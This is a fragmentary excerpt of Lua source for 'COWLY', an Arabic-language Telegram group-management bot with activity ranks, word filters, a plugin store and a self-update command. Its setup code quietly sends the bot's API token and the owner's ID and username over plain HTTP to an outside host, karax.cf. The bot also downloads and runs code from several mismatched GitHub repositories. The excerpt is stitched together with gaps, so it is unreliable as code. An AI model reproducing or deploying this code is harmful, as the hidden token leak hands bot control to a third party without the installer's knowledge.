...
https.request('http://karax.cf/COWLY/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("COWLY", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/COWLY
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./COWLY.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("QW", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S COWLY -X kill
screen -S COWLY ./COWLY
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/COWLYTEAM/Files_COWLY/master/File_Bot/commands.lua") 
...
local COWLY_Msg = ''  
if msgs < 100 then 
COWLY_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
COWLY_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
COWLY_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
COWLY_Msg = 'متفاعل' 
elseif msgs < 1200 then 
COWLY_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
COWLY_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
COWLY_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
COWLY_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
COWLY_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
COWLY_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
COWLY_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
COWLY_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
COWLY_Msg = 'رب التفاعل'  
end 
return COWLY_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceCOWLY(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,COWLY_Msg) 
return false  
end 
if text then    
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local COWLY1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..COWLY1.server.uptime_in_days..'('..COWLY1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..COWLY1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..COWLY1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..COWLY1.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ™' and SudoBot(msg) then 
os.execute('rm -rf COWLY.lua')
os.execute('wget https://raw.githubusercontent.com/FASAZTEAE/COWLY/master/COWLY.lua')
send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس كاولي\n📡| الاصدار ← { 1.2v}')
dofile('COWLY.lua')  
end
if text == 'الاصدار 📟' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'📡| اصدار سورس كاولي \n📟| الاصدار ←{ 1.2v}') 
end
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..COWLYk..''..COWLY..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local COWLY1_Msg = database:get(bot_id.."COWLY1:Add:Filter:Rp2"..text..msg.chat_id_)   
if COWLY1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if COWLY_Msg and not Special(msg) then  
local COWLY_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if COWLY_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
os.execute('rm -rf COWLY.lua')
os.execute('wget https://raw.githubusercontent.com/COWLYTEAM/COWLY/master/COWLY.lua')
send(msg.chat_id_, msg.id_,'??| تم تحديث البوت \n📮| لديك اخر اصدار سورس كاولي\n📡| الاصدار ← { 1.2v}')
dofile('COWLY.lua')  
end
...
Text = [[
🔘┇اهلا بك في سورس كاولي 🦅
 ء━━━━━━━━━━━━━
🔰┇COWLEY TEAM
 ء━━━━━━━━━━━━━━
📮┇[قناه السورس](t.me/iraqqpqp) 

👮‍♂️┇[مطور السورس](sarazzqpqpvevo

📮┇[قناه السورس](t.me/iraqqpqp) 

📌┇[لــ تواصل](t.me/COWLEYX_BOT)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/COWLYTEAM/Files_COWLY/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n📁| اهلا بك في متجر ملفات كاولي\n🔰| ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n"
...
raw.githubusercontent.com/BOYKATEAM/Files_BOYKA/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('COWLY.lua')  
else
send(msg.chat_id_, msg.id_,"⚠️| عذرا هاذا ملف ليس من ملفات سورس كاولي\n") 
end
return false
end
...
database:set(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"🚸|ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."COWLY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."COWLY1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖|تم منع الكلمه مع التحذير")  
database:del(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."COWLY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."COWLY1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."COWLY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖|ارسل الكلمه الان")  
database:set(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."COWLY1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."COWLY1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."COWLY1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."COWLY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."COWLY1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."COWLY1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔|قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local COWLY_Msg = database:get(bot_id.."COWLY1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..COWLY_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'كاولي').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'كاولي')
local COWLY_Msg = {
'اسمي مينو كول💘؟',
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
...
send(msg.chat_id_, msg.id_,'['..COWLY_Msg[math.random(#COWLY_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'كاولي').." غادر" or text == 'بوت غادر' then  
...
-- vardump(data) 
COWLYdx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'كاولي')
...
COWLY = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(COWLY)
...
--------------------------------------------------------------------------------------------------------------
SourceCOWLY(data.message_,data)
...
------------------------------------------------------------------------
local COWLYAbot = database:get(bot_id.."COWLY1:Add:Filter:Rp2"..text..result.chat_id_)   
if COWLYAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..COWLYAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local COWLY1_Msg = database:get(bot_id.."COWLY1:Add:Filter:Rp2"..text..result.chat_id_)   
if COWLY1_Msg then    
send(msg.chat_id_, msg.id_,"🔖|"..COWLY1_Msg)
